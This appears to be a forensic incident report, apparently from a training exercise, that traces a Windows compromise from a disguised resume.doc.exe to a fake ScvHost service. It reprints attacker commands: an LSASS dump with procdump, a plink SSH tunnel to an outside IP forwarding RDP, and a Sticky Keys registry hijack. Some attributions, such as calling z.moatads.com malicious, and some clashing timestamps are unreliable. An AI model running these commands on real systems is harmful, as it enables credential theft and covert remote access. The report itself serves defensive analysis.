### **Technical Incident Report: Compromise Through Malicious Activity Leading to the Download of `resume.doc.exe`**

#### **Overview**
This report outlines the sequence of events that led to the compromise of a system through the download and execution of a malicious file named `resume.doc.exe`. The incident was investigated through detailed analysis of browser history, network activity, PowerShell script executions, and file system changes. The purpose of this report is to provide a clear and comprehensive account of how the attack was carried out, identify the indicators of compromise (IOCs), and offer recommendations to prevent future occurrences.

---

#### **Timeline of Events**

1. **Initial Web Browsing Activity**
   - **Date/Time:** 17/08/2019 05:38:43 AM - 05:39:30 AM
   - **User:** Alan
   - **Activity:** The user was browsing legitimate news websites, specifically `washingtonpost.com` and `abc.net.au`. During this time, the browser interacted with various elements on these sites, including advertisements.
   - **Critical Interaction:** 
     - **Malicious Interaction:** While on `washingtonpost.com`, a script from the domain `z.moatads.com` was executed. This domain is known to distribute malicious content, often through advertising networks embedded in legitimate websites.
   - **Evidence:**
     ```plaintext
     URL: https://www.washingtonpost.com/
     Accessed Date/Time: 17/08/2019 05:38:46 AM
     Page Title: Washington Post: Breaking News, World, US, DC News & Analysis
     ```
     ```plaintext
     URL: https://z.moatads.com/washpostprebidheader710741008563/yi.js
     Accessed Date/Time: 17/08/2019 05:38:56 AM
     ```

   **Supporting Analysis:**
   - The domain `z.moatads.com` is associated with malicious activities, often used to serve obfuscated scripts that can lead to further malicious downloads or redirections. This interaction set the stage for the subsequent compromise.

2. **Redirection to Malicious File-Sharing Site**
   - **Date/Time:** 17/08/2019 05:39:19 AM - 05:39:50 AM
   - **Activity:** Following the interaction with `z.moatads.com`, the user’s browser was redirected to `uploadfiles.io`, a file-sharing site that has been used to distribute malware.
   - **Outcome:** The redirection was part of an orchestrated attack that aimed to deliver a malicious payload to the user’s system.
   - **Evidence:**
     ```plaintext
     URL: https://uploadfiles.io/hr4z39kn
     Accessed Date/Time: 17/08/2019 05:39:19 AM
     ```

   **Analysis:**
   - The redirection likely exploited the user's browsing session to download a malicious file. The interaction with `uploadfiles.io` was a critical step in the attack chain, leading directly to the malicious download.

3. **Execution of Malicious PowerShell Scripts**
   - **Date/Time:** 17/08/2019 05:46:18 AM - 05:48:39 AM
   - **Activity:** The system executed several PowerShell scripts that were downloaded from Pastebin. These scripts were Base64-encoded and decoded by PowerShell before being executed. They performed various malicious tasks, such as disabling security features, establishing persistence, and executing additional payloads.
   - **Details of the Scripts:**
     - **Script 1:** A script designed to validate the existence of a specific file.
     - **Script 2 (`sticky.ps1`):** Set up persistence by modifying the Image File Execution Options (IFEO) registry key to hijack the `sethc.exe` process.
     - **Script 3 (`Service.ps1`):** Created and started a malicious service named `ScvHost`, using a fake `scvhost.exe` located in a suspicious directory (`C:\Users\Alan\AppData\Local\Temp\scvhost.exe`).
     - **Script 4:** Downloaded an additional payload, potentially another executable designed to further compromise the system.
   - **Evidence:**
     ```plaintext
     GET /raw/SZgzvpaU HTTP/1.1
     User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1
     Host: pastebin.com
     Connection: Keep-Alive
     Decoded Content:
     Param(
         [Parameter(Mandatory=$true,
         ValueFromPipeLine=$false)]
         [String[]]
         $ScriptPath
     )
     ```
     ```plaintext
     GET /raw/0FmG9g40 HTTP/1.1
     User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1
     Host: pastebin.com
     Connection: Keep-Alive
     Decoded Content:
     $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
     if (!(Test-Path -Path $path)) {
         New-Item -Path $path -Force
     }
     ```

   **Analysis:**
   - These scripts were crucial to the attack as they facilitated the establishment of a persistent foothold on the system and prepared the environment for further exploitation. The use of Pastebin to host and distribute these scripts highlights the attacker's reliance on public platforms to execute their payload.

4. **Download and Execution of `resume.doc.exe`**
   - **Date/Time:** 17/08/2019 05:39:50 AM - 05:41:59 AM
   - **Activity:** The malicious file `resume.doc.exe` was downloaded from `uploadfiles.io` and executed shortly after. This file is a trojan disguised as a document, used to initiate the full compromise of the system.
   - **Execution Details:**
     - **File Path:** `C:\Users\Alan\Downloads\resume.doc.exe`
     - **Hash:** `bb3aef05f9007687f06fd26eab80612e5960249a5df74fe3ef6399b7c087b8e9`
     - **VirusTotal Detection:** 53 out of 70 engines flagged the file as malicious.
   - **Evidence:**
     ```plaintext
     Malicious Download: resume.doc.exe 17/08/2019 05:39:50 AM
     File Name: C:\Users\Alan\Downloads\resume.doc.exe
     Last Run Date/Time: 17/08/2019 05:41:59 AM
     ```

   **Analysis:**
   - The download and execution of `resume.doc.exe` represent the culmination of the attack. The file, posing as a harmless document, was actually a malicious executable designed to carry out further malicious activities on the system, such as stealing data, installing backdoors, and communicating with the attacker's Command and Control (C2) server.

5. **Persistence Mechanism: Malicious `ScvHost` Service**
   - **Date/Time:** 17/08/2019 05:49:18 AM
   - **Activity:** The PowerShell scripts installed a malicious service named `ScvHost`, using a file named `scvhost.exe` located in the `C:\Users\Alan\AppData\Local\Temp` directory. It is crucial to note that the legitimate `svchost.exe` is located in `C:\Windows\System32\`, and any instance of `svchost.exe` outside this directory should be treated as malicious.
   - **Evidence:**
     ```plaintext
     Event ID: 7045
     Source: Service Control Manager
     Description: A service was installed in the system.
     Service Name: ScvHost
     Service File Name: C:\Users\Alan\AppData\Local\Temp\scvhost.exe
     Time: 17/08/2019 05:49:18 AM
     ```

   **Analysis:**
   - The creation of the `ScvHost` service was a critical step in maintaining the attacker’s control over the compromised system. This service, running under the highly privileged `LocalSystem` account, ensured that the malicious payloads could continue operating even after a system reboot.

---

#### **Conclusion**

The system was compromised through a well-orchestrated attack that began with the user's interaction with a legitimate website, which led to the execution of a malicious advertisement script. This script redirected the user to a malicious file-sharing site, where `resume.doc.exe` was downloaded. Subsequent execution of the file initiated a series of PowerShell commands that downloaded and executed additional malicious scripts from Pastebin, ultimately establishing persistence on the system through the `ScvHost` service.

### **Indicators of Compromise (IOCs):**
- **Malicious Domain:** `z.moatads.com`
- **Suspicious File:** `resume.doc.exe`
  - **Hash:** `bb3aef05f9007687f06fd26eab80612e5960249a5df74fe3ef6399b7c087b8e9`
- **Malicious Service:** `ScvHost`
  - **Path:** `C:\Users\Alan\AppData\Local\Temp\scvhost.exe`
- **PowerShell Scripts from Pastebin:**
  - **Base64 Decoded Scripts:** `sticky.ps1`, `Service.ps1`, etc.

###
### **Technical Incident Report: Extent of the Compromise**

---

#### **2. What Was the Extent of the Compromise?**

The compromise of the system was extensive, involving multiple stages that allowed the attacker to disable security features, persistently control the system, and establish remote access for further exploitation. The attacker used a combination of PowerShell scripts, malicious executables, and SSH tunneling to ensure deep and sustained access to the compromised system.

---

### **Second and Third Stage of Infection**

The second and third stages of the infection involved the execution of PowerShell scripts to disable security mechanisms and establish persistence, followed by the deployment of a backdoor and the setup of an SSH tunnel for remote control.

#### **Second Stage: Execution of Malicious PowerShell Scripts**

1. **Execution of `vagrant-shell.ps1`:**
   - **Execution Context:** The `vagrant-shell.ps1` script was executed to disable various security features, particularly those related to Windows Defender. This script neutralized the system's defenses, allowing the attacker to proceed with further malicious actions without being detected.
   - **Evidence:**
     - **PowerShell Logs:** The execution was recorded in the PowerShell logs, showing the script being run from `c:\tmp\vagrant-shell.ps1`.
     - **Impact:** The script disabled real-time protection, behavior monitoring, and other critical Windows Defender features.
     ```plaintext
     Execution Time: 2019-08-17 13:36:26 to 13:36:33
     Script Path: c:\tmp\vagrant-shell.ps1
     ```

2. **Execution of `WinRM_Elevated_Shell.ps1`:**
   - **Execution Context:** This script created a scheduled task to run with elevated privileges, allowing the attacker to execute commands as a system-level user.
   - **Evidence:**
     - **PowerShell Logs:** The script `winrm-elevated-shell.ps1` was executed, creating a scheduled task named `WinRM_Elevated_Shell` to ensure the attacker retained elevated access.
     ```plaintext
     Execution Time: 2019-08-17 13:36:27 to 13:36:40
     Script Path: c:/windows/temp/winrm-elevated-shell.ps1
     ```

3. **Execution of `Sticky.ps1`:**
   - **Execution Context:** The `Sticky.ps1` script hijacked the Sticky Keys functionality by replacing the `sethc.exe` process with `cmd.exe`, allowing the attacker to gain system-level access from the login screen.
   - **Evidence:**
     - **PowerShell Logs:** The execution of this script was recorded, showing it was run from `C:\Users\Alan\AppData\Local\Temp\Sticky.ps1`.
     - **Impact:** This script modified the IFEO registry key for `sethc.exe`, enabling the attacker to press Shift five times at the login screen to access a command prompt with system privileges.
     ```plaintext
     Execution Time: 2019-08-17 13:49:01 to 13:49:02
     Script Path: C:\Users\Alan\AppData\Local\Temp\Sticky.ps1
     ```

4. **Execution of `Service.ps1`:**
   - **Execution Context:** The `Service.ps1` script created and started a malicious service named `ScvHost` that ensured persistence by running a malicious executable upon system startup.
   - **Evidence:**
     - **PowerShell Logs:** The execution of `Service.ps1` was recorded, indicating that it was run from `C:\Users\Alan\AppData\Local\Temp\Service.ps1`.
     - **Impact:** This script ensured that the `scvhost.exe` executable would run automatically on system startup, maintaining the attacker's access.
     ```plaintext
     Execution Time: 2019-08-17 13:49:18 to 13:49:48
     Script Path: C:\Users\Alan\AppData\Local\Temp\Service.ps1
     ```

#### **Third Stage: Deployment of Backdoor and Establishment of Remote Access**

1. **Download and Execution of `scvhost.exe`:**
   - **Execution Context:** The `scvhost.exe` file, maliciously named to mimic the legitimate Windows process `svchost.exe`, was downloaded and executed. This file served as a backdoor, providing the attacker with persistent remote access to the compromised system.
   - **Evidence:**
     - **File Analysis:** The presence and execution of `scvhost.exe` were confirmed through memory and disk analysis. Unlike the legitimate `svchost.exe` located in `C:\Windows\System32\`, this version was found in `C:\Users\Alan\AppData\Local\Temp\` and was flagged as malicious by multiple antivirus engines.
     - **Impact:** The execution of `scvhost.exe` allowed the attacker to maintain a backdoor for remote control.
     ```plaintext
     File Name: scvhost.exe
     File Path: C:\Users\Alan\AppData\Local\Temp\scvhost.exe
     ```

2. **Establishment of SSH Tunnel Using `plink.exe`:**
   - **Execution Context:** The `plink.exe` executable was used to create an SSH tunnel that forwarded a local port (127.0.0.1:12345) to a remote IP (10.2.0.2:3389), effectively enabling remote desktop access over RDP. This port forwarding facilitated unauthorized remote access to the system.
   - **Evidence:**
     - **Prefetch Files:** The execution of `plink.exe` was confirmed via prefetch files, which indicated it was run from `\Windows\Temp\`.
     - **Command-Line Arguments:** The command-line arguments used with `plink.exe` specified the SSH connection to the remote server `69.50.64.20` on port `22` and the forwarding of traffic to port `3389`, the default port for RDP.
     ```plaintext
     Execution Time: 2019-08-17 05:52:31 AM (UTC)
     File Path: \Windows\Temp\plink.exe
     Command: plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
     ```

   - **Significance:** The execution of plink.exe and its use for SSH tunneling and RDP forwarding were critical in ensuring the attacker could maintain control over the compromised system. This persistence mechanism allowed the attacker to bypass network defenses and potentially exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, indicates the attacker was specifically aiming to enable remote desktop access, which is a strong indication of the sophistication and intent behind the compromise..

---

### **Actions Taken on Target**

1. **Execution of Malicious Scripts and Files:**
   - **PowerShell Scripts:** The attacker executed multiple PowerShell scripts (`vagrant-shell.ps1`, `WinRM_Elevated_Shell.ps1`, `Sticky.ps1`, `Service.ps1`) to disable security features, establish persistence, and create a backdoor.
   - **Malicious Executables:** The attacker deployed and executed `scvhost.exe`, a malicious backdoor that mimicked a legitimate Windows process.

2. **Establishment of Persistence:**
   - **Service Creation:** The attacker used the `Service.ps1` script to create a persistent service (`ScvHost`), ensuring that the backdoor would remain active even after system reboots.
   - **IFEO Modification:** The attacker modified the IFEO registry key using `Sticky.ps1`, replacing `sethc.exe` with `cmd.exe` to gain easy access to a command prompt with elevated privileges.

3. **Establishment of Remote Access:**
   - **SSH Tunnel Creation:** The attacker used `plink.exe` to create an SSH tunnel that forwarded RDP traffic, enabling remote desktop access over port `3389`.
   - **C2 Communication:** The `scvhost.exe` backdoor communicated with the C2 server at `69.50.64.20`, allowing the attacker to issue commands and maintain control over the compromised system.

---

### **Conclusion**

The extent of the compromise was severe, involving multiple stages of infection that effectively disabled the system's defenses, established persistent backdoors, and enabled remote access through an SSH tunnel. The attacker's use of PowerShell scripts and malicious executables, combined with the creation of an SSH tunnel via `plink.exe`, allowed for sustained control over the compromised system. The communication with a C2 server further indicates that the attacker maintained ongoing remote access, potentially for data exfiltration or further exploitation.

This report highlights the sophisticated nature of the attack, the methods used to bypass security measures, and the extent of the system compromise. The evidence gathered from PowerShell logs, memory analysis, and network traffic provides a detailed understanding of the attack's progression and impact.
### **Technical Incident Report: Data Exfiltration Analysis**

---

#### **3. Was Anything Taken?**

The investigation into the compromised system revealed that sensitive information was likely stolen from the host. The attacker used various tools and methods to extract and potentially exfiltrate critical data, including credential dumps and remote access through an SSH tunnel.

---

### **What Information Was Likely Stolen from the Host?**

#### **1. Credential Dumping via `Procdump`**

One of the most critical pieces of evidence pointing to data exfiltration is the use of `Procdump`, a Sysinternals tool, to dump the memory of the `lsass.exe` process. The Local Security Authority Subsystem Service (LSASS) is responsible for enforcing security policy on the system, including managing user logins, password changes, and generating access tokens. By dumping the memory of `lsass.exe`, the attacker could extract plaintext passwords and other authentication tokens, which could then be used for lateral movement within the network or for further exploitation.

- **Evidence:**
  - **Command History:**
    The command history captured in `ConsoleHost_history.txt` reveals that the attacker downloaded `Procdump`, extracted the `lsass.dmp` file, and potentially exfiltrated sensitive credentials stored within it.

    ```plaintext
    cd \Users\Craig\Desktop
    dir
    $uri = "https://download.sysinternals.com/files/Procdump.zip"
    Invoke-WebRequest -Uri $uri -OutFile "Procdump.zip"
    cd .\Procdump\
    procdump64.exe -ma -accepteula lsass.exe lsass.dmp
    dir
    .\procdump64.exe -ma -accepteula lsass.exe lsass.dmp
    ```

  - **Location:**
    The `ConsoleHost_history.txt` file was found at `C:\Users\Craig\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`, providing a direct record of the attacker's actions.

- **Impact:**
  - **Credential Theft:**
    The `lsass.dmp` file would likely contain plaintext passwords, NTLM hashes, and Kerberos tickets, enabling the attacker to impersonate users and access additional systems within the network.
  - **Further Compromise:**
    With these credentials, the attacker could perform lateral movement, escalate privileges, or exfiltrate additional data.

---

#### **2. Remote Access and Potential Data Exfiltration via `plink.exe`**

The attacker used `plink.exe`, a command-line tool from the PuTTY suite, to establish an SSH tunnel that forwarded traffic from a local port to a remote IP address. This setup enabled the attacker to create a secure and encrypted communication channel, potentially for exfiltrating data or maintaining remote access to the compromised system.

- **Evidence:**
  - **Execution Context:**
    The `plink.exe` tool was executed from `\Windows\Temp\`, with command-line arguments that set up an SSH tunnel, forwarding traffic from `127.0.0.1:12345` to `10.2.0.2:3389` via the remote server `69.50.64.20` on port `22`.

    ```plaintext
    plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
    ```

  - **Impact:**
    - **Remote Desktop Access:**
      The forwarding of traffic to port `3389` suggests that the attacker established a Remote Desktop Protocol (RDP) connection, providing them with full remote control of the system.
    - **Data Exfiltration:**
      Through this encrypted tunnel, the attacker could have exfiltrated sensitive files, credential dumps, or other critical information without detection.

- **Location:**
  - The execution of `plink.exe` was confirmed through prefetch files located in `Windows\Prefetch\`, and the command-line arguments were identified through memory analysis.

---

#### **3. Potential Exfiltration of Files or Documents**

Given the attacker's persistent access to the system and their ability to control it remotely, it is likely that they also exfiltrated specific files or documents of interest. While direct evidence of file transfer was not identified, the capability to do so was clearly established.

- **Possible Methods:**
  - **RDP File Transfers:**
    Through the established RDP session, the attacker could have manually copied files from the compromised system to their own environment.
  - **Encrypted Data Streams:**
    The SSH tunnel provided by `plink.exe` would have allowed the attacker to transfer files securely, bypassing most network monitoring tools.

- **Areas of Concern:**
  - **Sensitive Documents:**
    The attacker's access to the user's desktop and other directories suggests that personal or sensitive corporate documents could have been targeted for exfiltration.
  - **System and Application Logs:**
    These logs could have been tampered with or exfiltrated to cover the attacker's tracks or to gather further intelligence on the compromised environment.

---

### **Conclusion**

The attacker likely exfiltrated critical data from the host, including plaintext credentials from the `lsass.dmp` file and potentially other sensitive documents through the established SSH tunnel. The use of `Procdump` to extract memory from `lsass.exe` provided the attacker with the means to harvest authentication credentials, which could be used for further attacks or sold on the dark web. The SSH tunnel established by `plink.exe` facilitated secure, encrypted communication, likely used for both remote control and data exfiltration. Given the evidence, it is highly probable that the attacker was able to exfiltrate valuable information, posing a significant threat to the security of the compromised network.

### **Recommendations**

- **Immediate Actions:**
  - Conduct a full audit of all systems to identify any additional compromised hosts or exfiltrated data.
  - Reset all user and administrative passwords within the network, focusing on those accounts identified in the `lsass.dmp` dump.
  - Block all outgoing connections to the identified C2 server (`69.50.64.20`) and investigate any related network traffic for signs of data exfiltration.

- **Long-Term Actions:**
  - Implement more rigorous monitoring of PowerShell activity and the use of administrative tools like `Procdump` and `plink.exe`.
  - Educate users about the dangers of phishing and the importance of verifying the legitimacy of downloaded files.
  - Regularly audit and review firewall and security settings to prevent unauthorized access and data exfiltration.
